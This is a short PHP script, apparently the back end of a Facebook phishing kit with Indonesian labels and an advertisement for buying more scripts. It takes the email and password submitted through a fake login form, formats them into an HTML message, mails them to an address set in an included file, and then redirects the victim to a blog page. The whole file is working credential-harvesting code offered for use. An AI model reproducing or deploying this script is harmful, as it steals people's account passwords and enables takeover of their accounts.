<?php $email = $_POST['email'];
$password = $_POST['password'];
$subject = "Akun Facebook $email";
$message = '<pre style="font-size: 1.1em;">
  <table>
    <tr>
      <th colspan="3" align="left">AKUN FACEBOOK 2019 FRESH</th>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <th colspan="3" align="left">DATA AKUN FACEBOOK</th>
    </tr>
    <tr>
      <td>Email Akun</td>
      <td>:</td>
      <td>' . $email . '</td>
    </tr>
    <tr>
      <td>Password Akun</td>
      <td>:</td>
      <td>' . $password . '</td>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <th colspan="3" align="left">Terima Kasih</th>
    </tr>
    <tr>
      <td>&nbsp;</td>
    </tr>
    <tr>
      <th colspan="3" align="left">Beli Script keren? Chat PULU PULU <a href="https://www.facebook.com/royadirye">Disini</a>.</th>
    </tr>
    </table>
    </pre>';
include 'email.php';
$headersx = 'MIME-Version: 1.0' . "
";
$headersx.= 'Content-type: text/html; charset=iso-8859-1' . "
";
include 'subject.php';
$datamail = mail($mailto, $subject, $message, $headersx);
header('location: https://pulu-puluuu.blogspot.com/2019/05/lanjutkan-ke-puluscript.html?m=1 ');
?>